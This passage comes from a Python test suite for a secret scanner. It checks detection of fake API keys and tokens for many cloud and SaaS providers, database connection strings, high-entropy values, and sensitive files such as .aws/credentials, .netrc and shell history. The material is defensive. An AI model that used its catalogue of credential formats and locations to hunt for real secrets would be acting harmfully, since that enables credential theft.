            with mock.patch.object(scan.subprocess, "run", return_value=completed):
                result = scan.check_sensitive_tracked(root, errors=errors)

            self.assertEqual(result, [])
            self.assertEqual(errors, [])


class SecretScanLimitTests(unittest.TestCase):
    def test_secret_fixture_marker_skips_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-fixture-") as root:
            with open(os.path.join(root, "config.py"), "w", encoding="utf-8") as handle:
                handle.write(
                    "# butian: allow-secret-fixtures\n"
                    'OPENAI_API_KEY = "sk-proj-1234567890abcdef1234567890"\n'
                )

            stats = {}
            findings = scan.scan_secrets(root, stats=stats)

            self.assertEqual(findings, [])
            self.assertEqual(stats["candidate_files"], 1)
            self.assertEqual(stats["skipped_fixture_files"], 1)

    def test_fixture_marker_is_required_for_test_like_secret_values(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-fixture-") as root:
            with open(os.path.join(root, "config.py"), "w", encoding="utf-8") as handle:
                handle.write('OPENAI_API_KEY = "sk-proj-1234567890abcdef1234567890"\n')

            findings = scan.scan_secrets(root)

            self.assertTrue(any(item["type"] == "openai_key" for item in findings))

    def test_scan_secrets_reports_limit_stats(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-limit-") as root:
            for index in range(3):
                with open(
                    os.path.join(root, f"config{index}.py"), "w", encoding="utf-8"
                ) as handle:
                    handle.write("VALUE = 'not-a-secret'\n")

            stats = {}
            findings = scan.scan_secrets(root, max_files=1, stats=stats)

            self.assertEqual(findings, [])
            self.assertEqual(stats["candidate_files"], 3)
            self.assertEqual(stats["scanned_files"], 1)
            self.assertEqual(stats["skipped_by_limit"], 2)

    def test_none_limit_uses_default_file_budget(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-limit-") as root:
            with open(os.path.join(root, "config.py"), "w", encoding="utf-8") as handle:
                handle.write("VALUE = 'not-a-secret'\n")

            stats = {}
            scan.scan_secrets(root, max_files=None, stats=stats)

            self.assertEqual(stats["max_files"], 500)
            self.assertEqual(stats["scanned_files"], 1)

    def test_scan_hygiene_reports_secret_scan_limit(self):
        with tempfile.TemporaryDirectory(prefix="butian-secret-limit-") as root:
            for index in range(2):
                with open(
                    os.path.join(root, f"config{index}.py"), "w", encoding="utf-8"
                ) as handle:
                    handle.write("VALUE = 'not-a-secret'\n")

            result = scan.scan_hygiene(root, max_secret_files=1)

            secret_scan = result["coverage"]["secret_scan"]
            self.assertEqual(secret_scan["max_files"], 1)
            self.assertEqual(secret_scan["candidate_files"], 2)
            self.assertEqual(secret_scan["skipped_by_limit"], 1)
            self.assertTrue(
                any(
                    item["step"] == "hygiene.secret_scan_limit"
                    for item in result["errors"]
                )
            )


class DefaultAssetPathTests(unittest.TestCase):
    def test_without_preflight_creates_run(self):
        with tempfile.TemporaryDirectory(prefix="butian-asset-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            path = scan.default_asset_path(root, "scan.json")
            self.assertTrue(path.endswith("scan.json"))
            self.assertIn(".butian", path)
            self.assertTrue(os.path.isdir(os.path.dirname(path)))

    def test_with_preflight_uses_run_dir(self):
        with tempfile.TemporaryDirectory(prefix="butian-asset-") as root:
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            run_dir = scan.ensure_butian_run(root)
            preflight = {"butian_workspace": {"run_dir": run_dir}}
            path = scan.default_asset_path(root, "test.json", preflight=preflight)
            self.assertTrue(path.endswith("test.json"))
            self.assertIn(run_dir, path)

    def test_preflight_run_dir_must_stay_under_project_workspace(self):
        with (
            tempfile.TemporaryDirectory(prefix="butian-asset-") as root,
            tempfile.TemporaryDirectory(prefix="butian-outside-") as outside,
        ):
            scan._GITIGNORE_STATUS_BY_PROJECT.clear()
            preflight = {"butian_workspace": {"run_dir": outside}}

            with self.assertRaises(ValueError):
                scan.default_asset_path(root, "scan.json", preflight=preflight)


class BuildOfficialVulnerabilityTests(unittest.TestCase):
    def test_builds_complete_vuln_record(self):
        package = {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"}
        osv_record = {
            "id": "GHSA-xxxx-xxxx-xxxx",
            "aliases": ["CVE-2024-0001"],
            "summary": "Prototype pollution in lodash",
            "affected": [
                {
                    "package": {"ecosystem": "npm", "name": "lodash"},
                    "ranges": [
                        {"events": [{"introduced": "0"}, {"fixed": "4.17.21"}]},
                    ],
                }
            ],
        }
        cve_enrichments = {
            "CVE-2024-0001": {
                "cveId": "CVE-2024-0001",
                "cvssMetrics": [{"baseScore": "7.5", "baseSeverity": "HIGH"}],
                "cweIds": ["CWE-400"],
                "kevListed": False,
            }
        }
        result = scan.build_official_vulnerability(package, osv_record, cve_enrichments)
        self.assertEqual(result["package"], "lodash")
        self.assertEqual(result["advisory_id"], "GHSA-xxxx-xxxx-xxxx")
        self.assertEqual(result["cve_id"], "CVE-2024-0001")
        self.assertEqual(result["severity"], "high")
        self.assertEqual(result["fixed_versions"], ["4.17.21"])
        self.assertIn("fixed_version_available", result["risk_signals"])
        self.assertIn("cvss_high", result["risk_signals"])
        self.assertEqual(result["vulnerability_source"], "official-osv")


class ParsePoetryLockTests(unittest.TestCase):
    def test_parses_poetry_lock(self):
        with tempfile.TemporaryDirectory(prefix="butian-poetry-") as root:
            with open(os.path.join(root, "poetry.lock"), "w") as f:
                f.write(
                    "[[package]]\n"
                    'name = "flask"\n'
                    'version = "2.0.3"\n'
                    'description = "A framework"\n'
                    "\n"
                    "[[package]]\n"
                    'name = "requests"\n'
                    'version = "2.31.0"\n'
                    'description = "HTTP lib"\n'
                )
            pkgs = scan.parse_poetry_lock(root)
            names = {p["name"] for p in pkgs}
            self.assertIn("flask", names)
            self.assertIn("requests", names)

    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-poetry-") as root:
            self.assertEqual(scan.parse_poetry_lock(root), [])


class ParseUvLockTests(unittest.TestCase):
    def test_missing_file(self):
        with tempfile.TemporaryDirectory(prefix="butian-uv-") as root:
            self.assertEqual(scan.parse_uv_lock(root), [])


class ProjectPythonExecutableTests(unittest.TestCase):
    def test_finds_venv_python(self):
        with tempfile.TemporaryDirectory(prefix="butian-pyexe-") as root:
            venv_dir = os.path.join(root, ".venv")
            os.makedirs(os.path.join(venv_dir, "bin"))
            # Create pyvenv.cfg to mark it as a venv
            with open(os.path.join(venv_dir, "pyvenv.cfg"), "w") as f:
                f.write("home = /usr/bin\n")
            python_path = os.path.join(venv_dir, "bin", "python3")
            with open(python_path, "w") as f:
                f.write("#!/bin/sh\n")
            os.chmod(python_path, 0o755)
            result = scan.project_python_executable(root)
            self.assertEqual(result, python_path)

    def test_no_venv(self):
        with tempfile.TemporaryDirectory(prefix="butian-pyexe-") as root:
            self.assertEqual(scan.project_python_executable(root), "")


class MakeRunIdTests(unittest.TestCase):
    def test_format(self):
        run_id = scan.make_run_id()
        self.assertRegex(run_id, r"^\d{8}-\d{6}$")


if __name__ == "__main__":
    unittest.main()


class CloudProviderKeyTests(unittest.TestCase):
    """Each test writes a single secret into a temp file and asserts it is
    detected with the expected type and confidence."""

    def _detect_one(self, content: str, expected_type: str, ext: str = ".py") -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-cloud-") as root:
            fpath = os.path.join(root, f"config{ext}")
            with open(fpath, "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(
                len(matches),
                1,
                f"Expected at least 1 finding of type '{expected_type}', "
                f"got {[f['type'] for f in findings]}",
            )
            return matches[0]

    # --- AWS ---
    def test_aws_access_key(self):
        f = self._detect_one(
            'AWS_KEY = "AKIA' + '1A2B3C4D5E6F7G8H"', "aws_access_key"
        )  # fake fixture
        self.assertEqual(f["confidence"], "high")

    def test_aws_session_token(self):
        f = self._detect_one(
            'TOKEN = "ASIA' + '1A2B3C4D5E6F7G8H"', "aws_session_token"
        )  # fake fixture
        self.assertEqual(f["confidence"], "high")

    # --- GCP ---
    def test_gcp_api_key(self):
        f = self._detect_one(
            'KEY = "AIzaSy' + 'A1234567890abcdefghijklmnopqrstuv"',
            "gcp_api_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_gcp_service_account_json(self):
        f = self._detect_one(
            'cfg = {"type": "service_account", "project_id": "myproj"}',  # fake fixture
            "gcp_service_account",
        )
        self.assertEqual(f["confidence"], "high")

    # --- Azure ---
    def test_azure_connection_string(self):
        acct_key = "A" * 64 + "B" * 24 + "=="
        f = self._detect_one(
            f'CONN = "DefaultEndpointsProtocol=https;AccountName=mystorage;AccountKey={acct_key}"',
            "azure_connection_string",
        )
        self.assertEqual(f["confidence"], "high")

    # --- Alibaba Cloud ---
    def test_aliyun_access_key(self):
        f = self._detect_one(
            'KEY = "LTAI' + '4FABcd1234EFgh56"', "aliyun_access_key"
        )  # fake fixture
        self.assertEqual(f["confidence"], "high")

    # --- Tencent Cloud ---
    def test_tencent_secret_id(self):
        f = self._detect_one(
            'TCLOUD_KEY = "AKID' + 'abcd1234efgh5678ijkl9012mnop3456"',
            "tencent_secret_id",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- Oracle Cloud ---
    def test_oracle_api_key(self):
        f = self._detect_one(
            'OCI_KEY = "ocid1'
            + '.user.oc1..aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"',  # fake fixture
            "oracle_api_key",
        )
        self.assertEqual(f["confidence"], "high")

    # --- DigitalOcean ---
    def test_digitalocean_token(self):
        f = self._detect_one('DO_KEY = "dop_v1_' + "a" * 64 + '"', "digitalocean_token")
        self.assertEqual(f["confidence"], "high")


class SaasTokenTests(unittest.TestCase):
    def _detect_one(self, content: str, expected_type: str, ext: str = ".py") -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-saas-") as root:
            fpath = os.path.join(root, f"config{ext}")
            with open(fpath, "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(
                len(matches),
                1,
                f"Expected at least 1 finding of type '{expected_type}', "
                f"got {[f['type'] for f in findings]}",
            )
            return matches[0]

    # --- GitHub ---
    def test_github_pat(self):
        f = self._detect_one(
            'GITHUB = "ghp_' + 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij"',
            "github_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- GitLab ---
    def test_gitlab_token(self):
        f = self._detect_one(
            'GITLAB = "glpat-' + 'aB3cD5eF7gH9iJ1kLmNoPqRs"',
            "gitlab_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_github_fine_grained_pat(self):
        f = self._detect_one(
            'GITHUB = "github_pat_' + "A" * 22 + "_" + "B" * 59 + '"',
            "github_fine_grained_pat",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_groq_api_key(self):
        f = self._detect_one(
            'GROQ = "gsk_' + "abcdefghijklmnopqrstuvwxyz1234567890ABCD" + '"',
            "groq_api_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_hashicorp_vault_token(self):
        f = self._detect_one(
            'VAULT_TOKEN = "hvs.' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "hashicorp_vault_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_pulumi_token(self):
        f = self._detect_one(
            'PULUMI_ACCESS_TOKEN = "pul-' + "A" * 40 + '"',
            "pulumi_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_gitlab_runner_token(self):
        f = self._detect_one(
            'GITLAB_RUNNER_TOKEN = "glrt-' + "abcdefghijklmnopqrstuvwxyz123456" + '"',
            "gitlab_runner_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    def test_cloudflare_api_token_with_context(self):
        f = self._detect_one(
            'CLOUDFLARE_API_TOKEN = "cf_'
            + "abcdefghijklmnopqrstuvwxyz1234567890"
            + '"',
            "cloudflare_api_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_vercel_token_with_context(self):
        f = self._detect_one(
            'VERCEL_TOKEN = "vc_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "vercel_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_netlify_token_with_context(self):
        f = self._detect_one(
            'NETLIFY_AUTH_TOKEN = "nf_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "netlify_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_railway_token_with_context(self):
        f = self._detect_one(
            'RAILWAY_TOKEN = "rw_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "railway_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_render_token_with_context(self):
        f = self._detect_one(
            'RENDER_API_KEY = "rnd_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "render_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_snyk_token_with_context(self):
        f = self._detect_one(
            'SNYK_TOKEN = "snyk_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "snyk_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_resend_api_key_with_context(self):
        f = self._detect_one(
            'RESEND_API_KEY = "re_' + "abcdefghijklmnopqrstuvwxyz1234567890" + '"',
            "resend_api_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_clerk_secret_key_with_context(self):
        f = self._detect_one(
            'CLERK_SECRET_KEY = "sk_live_'
            + "abcdefghijklmnopqrstuvwxyz1234567890"
            + '"',
            "clerk_secret_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_supabase_service_role_key_with_context(self):
        f = self._detect_one(
            'SUPABASE_SERVICE_ROLE_KEY = "eyJ'
            + "abcdefghijklmnopqrstuvwxyz123456.eyJabcdefghijklmnopqrstuvwxyz123456."
            + 'abcdefghijklmnopqrstuvwxyz123456"',
            "supabase_service_role_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_algolia_admin_key_with_context(self):
        f = self._detect_one(
            'ALGOLIA_ADMIN_API_KEY = "' + "abcdef1234567890abcdef1234567890" + '"',
            "algolia_admin_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    # --- Slack ---
    def test_slack_bot_token(self):
        f = self._detect_one(
            'SLACK = "xoxb-' + '123456-abcdef-ghijklmnopqrstuvwx"',
            "slack_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- Discord ---
    def test_discord_token(self):
        f = self._detect_one(
            'DISCORD = "MTIzNDU2'
            + 'Nzg5MDEyMzQ1Njc4O.Yabcde.abcdefghijk1mnopqrstuvwxzABCD"',  # fake fixture
            "discord_token",
        )
        self.assertEqual(f["confidence"], "high")

    # --- Stripe ---
    def test_stripe_secret_key(self):
        f = self._detect_one(
            'STRIPE = "sk_live_' + 'abcdefghijklmnopqrstuvwxyz1234"',
            "stripe_secret_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- SendGrid ---
    def test_sendgrid_api_key(self):
        f = self._detect_one(
            'SENDGRID = "SG.'
            + 'abcdefghijklmnopqrstuv.abcdefghijklmnopqrstuvwxyz1234567890abcdefg"',  # fake fixture
            "sendgrid_api_key",
        )
        self.assertEqual(f["confidence"], "high")

    # --- Twilio ---
    def test_twilio_account_sid(self):
        f = self._detect_one(
            'TWILIO = "AC' + 'abcdef1234567890abcdef1234567890"',
            "twilio_account_sid",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- Anthropic ---
    def test_anthropic_key(self):
        f = self._detect_one(
            'CLAUDE = "sk-ant-' + 'api03-abcdefghijklmnopqrstuvwxyz"',
            "anthropic_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- Hugging Face ---
    def test_huggingface_token(self):
        f = self._detect_one(
            'HF = "hf_' + 'abcdefghijklmnopqrstuvwxyz1234567890abcd"',  # fake fixture
            "huggingface_token",
        )
        self.assertEqual(f["confidence"], "high")

    # --- PyPI ---
    def test_pypi_token(self):
        f = self._detect_one(
            'PYPI = "pypi-'
            + 'AgEIcHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"',  # fake fixture
            "pypi_token",
        )
        self.assertEqual(f["confidence"], "high")

    # --- Docker Hub ---
    def test_docker_hub_token(self):
        f = self._detect_one(
            'DOCKER = "dckr_pat_' + 'abcdefghijklmnopqrstuvwxyz"',
            "docker_hub_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- NPM ---
    def test_npmrc_auth_token(self):
        f = self._detect_one(
            'NPM = "npm_' + 'abcdefghijklmnopqrstuvwxyz1234567890"',
            "npmrc_auth_token",  # fake fixture
        )
        self.assertEqual(f["confidence"], "high")

    # --- Databricks ---
    def test_databricks_token(self):
        f = self._detect_one(
            'DATABRICKS = "dapi' + 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"',  # fake fixture
            "databricks_token",
        )
        self.assertEqual(f["confidence"], "high")


class ConnectionStringTests(unittest.TestCase):
    def _detect_one(self, content: str, expected_type: str) -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-conn-") as root:
            with open(os.path.join(root, "config.py"), "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(len(matches), 1)
            return matches[0]

    def test_postgres_connection(self):
        f = self._detect_one(
            'DB = "postgresql'
            + '://admin:secretpass@db.prod.internal:5432/mydb"',  # fake fixture
            "postgres_connection",
        )
        self.assertEqual(f["confidence"], "high")

    def test_mongodb_connection(self):
        f = self._detect_one(
            'MONGO = "mongodb'
            + '://root:password123@mongo.prod.internal:27017/prod"',  # fake fixture
            "mongodb_connection",
        )
        self.assertEqual(f["confidence"], "high")

    def test_mysql_connection(self):
        f = self._detect_one(
            'MYSQL = "mysql'
            + '://user:pass123@mysql.prod.internal:3306/db"',  # fake fixture
            "mysql_connection",
        )
        self.assertEqual(f["confidence"], "high")

    def test_redis_connection(self):
        f = self._detect_one(
            'REDIS = "redis'
            + '://:mysecretpass@redis.prod.internal:6379/0"',  # fake fixture
            "redis_connection",
        )
        self.assertEqual(f["confidence"], "high")


class GenericPatternTests(unittest.TestCase):
    def _detect_one(self, content: str, expected_type: str) -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-generic-") as root:
            with open(os.path.join(root, "config.py"), "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(len(matches), 1)
            return matches[0]

    def test_jwt_token(self):
        f = self._detect_one(
            'TOKEN = "eyJhbGci'
            + 'OiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123def456ghi789"',  # fake fixture
            "jwt_token",
        )
        self.assertEqual(f["confidence"], "high")

    def test_bearer_token(self):
        f = self._detect_one(
            "Authorization: Bearer "
            + "eyJhbGciOiJIUz"
            + "I1NiJ9.eyJzdWIiOiIxMjMifQ.sig",  # fake fixture
            "bearer_token",
        )
        self.assertEqual(f["confidence"], "high")

    def test_generic_password(self):
        f = self._detect_one(
            'pwd = "my_super_secret_password"',
            "generic_password",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_generic_api_key(self):
        f = self._detect_one(
            'api_key = "abcdefghij12345678"',
            "generic_api_key",  # fake fixture
        )
        self.assertEqual(f["confidence"], "medium")

    def test_generic_token(self):
        f = self._detect_one(
            'access_token = "eyJhbGciOiJzomerandomtokenhere1234567890abc"',  # fake fixture
            "generic_token",
        )
        self.assertEqual(f["confidence"], "medium")

    def test_webhook_url(self):
        f = self._detect_one(
            'HOOK = "https://hooks.mycompany.com/webhooks/abc123def456ghi789jkl012mno345"',  # fake fixture
            "webhook_url",
        )
        self.assertEqual(f["confidence"], "high")

    def test_encryption_key(self):
        f = self._detect_one(
            'aes_key = "a1b2c3d4' + 'e5f6g7h8i9j0k1l2m3n4o5p6q7r8"',  # fake fixture
            "encryption_key",
        )
        self.assertEqual(f["confidence"], "medium")


class EntropyEngineTests(unittest.TestCase):
    """Tests for the Shannon entropy detection functions."""

    def test_shannon_entropy_empty(self):
        self.assertEqual(scan._shannon_entropy(""), 0.0)

    def test_shannon_entropy_single_char(self):
        self.assertEqual(scan._shannon_entropy("a"), 0.0)

    def test_shannon_entropy_uniform(self):
        # All same character means zero entropy.
        self.assertEqual(scan._shannon_entropy("aaaa"), 0.0)

    def test_shannon_entropy_high(self):
        # Mixed characters produce high entropy.
        entropy = scan._shannon_entropy("aB3xY9kL2mN7pQ5rT")
        self.assertGreater(entropy, 3.5)

    def test_shannon_entropy_base64_like(self):
        s = "K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72o0JT3Yw+"
        entropy = scan._shannon_entropy(s)
        self.assertGreater(entropy, 4.5)

    def test_entropy_check_value_too_short(self):
        self.assertIsNone(scan.entropy_check_value("short"))

    def test_entropy_check_value_pure_number(self):
        self.assertIsNone(scan.entropy_check_value("12345678901234567890"))

    def test_entropy_check_value_pure_alpha(self):
        self.assertIsNone(scan.entropy_check_value("abcdefghijklmnopqrst"))

    def test_entropy_check_value_high_entropy_base64(self):
        s = "K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72o0JT3Yw+"
        result = scan.entropy_check_value(s)
        self.assertIsNotNone(result)
        assert result is not None  # for type checkers
        self.assertEqual(result["entropy_type"], "base64_high_entropy")

    def test_entropy_check_value_hex(self):
        s = "e10adc3949ba59abbe56e057f20f883e"
        result = scan.entropy_check_value(s)
        # This known MD5 has high enough hex entropy.
        self.assertIsNotNone(result)
        assert result is not None  # for type checkers
        self.assertIn(
            result["entropy_type"], ("hex_high_entropy", "generic_high_entropy")
        )

    def test_entropy_scan_env_file_with_secret(self):
        """High-entropy value with a KEY hint in .env should be detected."""
        with tempfile.TemporaryDirectory(prefix="butian-ent-") as root:
            with open(os.path.join(root, ".env"), "w") as f:
                f.write(
                    'APP_SECRET_KEY="'
                    + "K7gNU3sdo+OL0wNhqoVWhr3g6s1xYv72o0JT3Yw+"
                    + '"\n'
                )
            findings = scan.scan_secrets(root)
            low = [f for f in findings if f["confidence"] == "low"]
            self.assertGreaterEqual(len(low), 1)
            self.assertEqual(low[0]["type"], "base64_high_entropy")

    def test_entropy_scan_skips_low_entropy_env(self):
        """Low-entropy values should NOT be flagged even with KEY hint."""
        with tempfile.TemporaryDirectory(prefix="butian-ent-") as root:
            with open(os.path.join(root, ".env"), "w") as f:
                f.write('APP_NAME="myapp"\nDEBUG=false\nPORT=3000\n')
            findings = scan.scan_secrets(root)
            low = [f for f in findings if f["confidence"] == "low"]
            self.assertEqual(len(low), 0)

    def test_entropy_scan_dedup_against_regex(self):
        """If regex already catches a line, entropy should NOT double-report."""
        with tempfile.TemporaryDirectory(prefix="butian-ent-") as root:
            with open(os.path.join(root, ".env"), "w") as f:
                # OpenAI key will be caught by regex; entropy should not add a duplicate
                key = "sk-proj-" + "abcdefghijklmnopqrstuvwxyz" + "1234567890"
                f.write(f'OPENAI_API_KEY="{key}"\n')
            findings = scan.scan_secrets(root)
            regex_hits = [f for f in findings if f["type"] == "openai_key"]
            low = [f for f in findings if f["confidence"] == "low"]
            self.assertGreaterEqual(len(regex_hits), 1)
            # No entropy duplicates for the same line
            self.assertEqual(len(low), 0)

    def test_entropy_scan_skips_code_identifier_lookup(self):
        with tempfile.TemporaryDirectory(prefix="butian-ent-") as root:
            with open(os.path.join(root, "config_lookup.py"), "w") as f:
                f.write("key = SSHD_OPTION_KEYS.get(parts[0].lower())\n")
            findings = scan.scan_secrets(root)
            self.assertEqual(findings, [])


class SkipMarkerTests(unittest.TestCase):
    def _count_findings(self, content: str) -> int:
        with tempfile.TemporaryDirectory(prefix="butian-skip-") as root:
            with open(os.path.join(root, ".env"), "w") as f:
                f.write(content)
            return len(scan.scan_secrets(root))

    def test_skip_changeme(self):
        self.assertEqual(
            self._count_findings('API_KEY = "changeme_to_your_real_key_here"'), 0
        )

    def test_skip_replace(self):
        self.assertEqual(
            self._count_findings('SECRET = "REPLACE_with_your_actual_secret"'), 0
        )

    def test_skip_dummy(self):
        self.assertEqual(
            self._count_findings('password = "dummy_password_not_real"'), 0
        )

    def test_skip_fake(self):
        self.assertEqual(
            self._count_findings('api_key = "fake_key_for_development"'), 0
        )

    def test_skip_mock(self):
        self.assertEqual(
            self._count_findings('token = "mock_token_for_development"'), 0
        )

    def test_skip_insert_your(self):
        self.assertEqual(self._count_findings('SECRET_KEY = "insert_your_key_here"'), 0)

    def test_skip_example(self):
        self.assertEqual(self._count_findings('api_key = "example_placeholder_key"'), 0)

    def test_skip_todo(self):
        self.assertEqual(
            self._count_findings('secret_key = "todo_replace_before_prod"'), 0
        )


# ---------------------------------------------------------------------------
# Word-boundary skip markers (xxx, test, default)
# These should only skip when appearing as whole words, not substrings
# ---------------------------------------------------------------------------


class SkipWordBoundaryTests(unittest.TestCase):
    def _count_findings(self, content: str) -> int:
        with tempfile.TemporaryDirectory(prefix="butian-skipwb-") as root:
            with open(os.path.join(root, ".env"), "w") as f:
                f.write(content)
            return len(scan.scan_secrets(root))

    def test_skip_standalone_test(self):
        key = "sk-proj-" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        self.assertGreaterEqual(
            self._count_findings(f'OPENAI_API_KEY="{key}"  # test\n'), 1
        )

    def test_skip_standalone_default_in_comment(self):
        key = "sk-proj-" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        self.assertGreaterEqual(
            self._count_findings(f'OPENAI_API_KEY="{key}"  # default\n'), 1
        )

    def test_no_skip_xxx_inside_value(self):
        """'xxx' inside a longer secret value should NOT trigger skip."""
        # A real-looking API key that happens to contain 'xxx'
        self._count_findings(
            'secret_key = "aXxxB3cD5eF7gH9iJ1kLmNoPqR2"\n'
        )  # fake fixture
        # Should NOT be skipped because 'xxx' is part of a value, not a word.
        # But it might not be detected as a finding either (depends on patterns)
        # The key assertion: it should at least not be blocked by skip markers


class NewSensitiveFileTests(unittest.TestCase):
    def _type_of(self, filename: str) -> str:
        return scan.sensitive_file_type(filename)

    # New file types added in v2
    def test_envrc(self):
        self.assertEqual(self._type_of(".envrc"), "envrc")

    def test_npmrc(self):
        self.assertEqual(self._type_of(".npmrc"), "npmrc")

    def test_pypirc(self):
        self.assertEqual(self._type_of(".pypirc"), "pypirc")

    def test_netrc(self):
        self.assertEqual(self._type_of(".netrc"), "netrc")

    def test_kubeconfig(self):
        self.assertEqual(self._type_of("kubeconfig"), "kubeconfig")

    def test_kube_config_dir(self):
        self.assertEqual(self._type_of(".kube/config"), "kubeconfig")

    def test_terraform_tfstate(self):
        self.assertEqual(self._type_of("terraform.tfstate"), "terraform_state")

    def test_terraform_tfvars(self):
        self.assertEqual(self._type_of("terraform.tfvars"), "terraform_vars")

    def test_aws_credentials(self):
        self.assertEqual(self._type_of(".aws/credentials"), "aws_credentials")

    def test_ci_secrets_yml(self):
        self.assertEqual(self._type_of("secrets.yml"), "ci_secrets")

    def test_ci_secrets_json(self):
        self.assertEqual(self._type_of("secrets.json"), "ci_secrets")

    def test_gradle_properties(self):
        self.assertEqual(self._type_of("gradle.properties"), "gradle_properties")

    def test_maven_settings(self):
        self.assertEqual(self._type_of("settings.xml"), "maven_settings")

    def test_history_bash(self):
        self.assertEqual(self._type_of(".bash_history"), "history")

    def test_history_zsh(self):
        self.assertEqual(self._type_of(".zsh_history"), "history")

    def test_backup_bak(self):
        self.assertEqual(self._type_of("config.yaml.bak"), "backup")

    def test_dump_sql(self):
        self.assertEqual(self._type_of("backup.sql"), "dump")

    def test_app_config_yml(self):
        self.assertEqual(self._type_of("application.yml"), "app_config")

    def test_docker_config(self):
        self.assertEqual(self._type_of("config.json"), "docker_cfg")

    def test_ansible_vault(self):
        self.assertEqual(self._type_of("vault_password.txt"), "ansible_vault")

    # Existing file types still work
    def test_env_file_still_works(self):
        self.assertEqual(self._type_of(".env"), "env_file")

    def test_pem_still_works(self):
        self.assertEqual(self._type_of("server.pem"), "private_key")

    def test_sqlite_still_works(self):
        self.assertEqual(self._type_of("data.sqlite"), "database")


class SecretScanFileSelectionTests(unittest.TestCase):
    def _detect_in_file(self, relpath: str, content: str, expected_type: str) -> dict:
        with tempfile.TemporaryDirectory(prefix="butian-secret-files-") as root:
            path = os.path.join(root, relpath)
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w") as f:
                f.write(content)
            findings = scan.scan_secrets(root)
            matches = [f for f in findings if f["type"] == expected_type]
            self.assertGreaterEqual(
                len(matches),
                1,
                f"Expected {expected_type} in {relpath}, got {findings}",
            )
            return matches[0]

    def test_scans_json_service_account_files(self):
        f = self._detect_in_file(
            "service-account.json",
            '{"type": "service_account", "project_id": "demo"}',
            "gcp_service_account",
        )
        self.assertEqual(f["file"], "service-account.json")

    def test_scans_properties_files(self):
        f = self._detect_in_file(
            "application.properties",
            "OPENAI_API_KEY=sk-proj-" + "A" * 32,
            "openai_key",
        )
        self.assertEqual(f["file"], "application.properties")

    def test_scans_terraform_variable_files(self):
        f = self._detect_in_file(
            "prod.tfvars",
            'vault_token = "hvs.' + "a" * 36 + '"',
            "hashicorp_vault_token",
        )
        self.assertEqual(f["file"], "prod.tfvars")

    def test_scans_extensionless_operational_files(self):
        f = self._detect_in_file(
            "Dockerfile",
            'ENV AWS_ACCESS_KEY_ID="AKIA' + "1A2B3C4D5E6F7G8H" + '"',
            "aws_access_key",
        )
        self.assertEqual(f["file"], "Dockerfile")

    def test_scans_sensitive_dotfiles(self):
        f = self._detect_in_file(
            ".npmrc",
            "//registry.npmjs.org/:_authToken=npm_" + "a" * 36,
            "npmrc_auth_token",
